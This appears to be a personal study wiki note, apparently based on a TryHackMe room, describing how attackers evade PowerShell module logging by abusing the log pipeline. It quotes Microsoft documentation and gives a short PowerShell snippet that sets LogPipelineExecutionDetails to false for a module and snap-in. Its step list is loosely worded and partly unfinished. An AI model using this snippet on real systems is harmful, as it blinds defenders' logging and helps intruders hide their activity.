# ETW Evasion Abusing Log Pipeline

Abusing the Log Pipeline is a [[Logging-And-Monitoring-Evasion]] technique where Pipeline of recording event is compromised in some manner.

## Windows

In regards to [](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events) Microsoft states since ...*"..Windows PowerShell 3.0, you can record execution events for the cmdlets and functions in Windows PowerShell modules and snap-ins by...When the `LogPipelineExecutionDetails` property value is TRUE (`$true`), Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer. The setting is effective only in the current session."*

For [[ETW]] abuse of it Pipeline mechanism requires an attacker to:
1. Obtain the target module.
2. Set module execution details to `$false` or tampering we the software piping events recorded before being piped out at somepoint .
3. Obtain to control
	- A module snap-in
	- ...
4. Modify and obfuscate abuse of the pipeline  
	- Set snap-in execution details to `$false`.

Disable Module Logging  of currently imported modules
```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
```

## References

[THM Evading Logging and Monitoring Room Room](https://tryhackme.com/room/monitoringevasion)
[Microsoft Documentation - Logging Module Events](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_eventlogs?view=powershell-5.1#logging-module-events)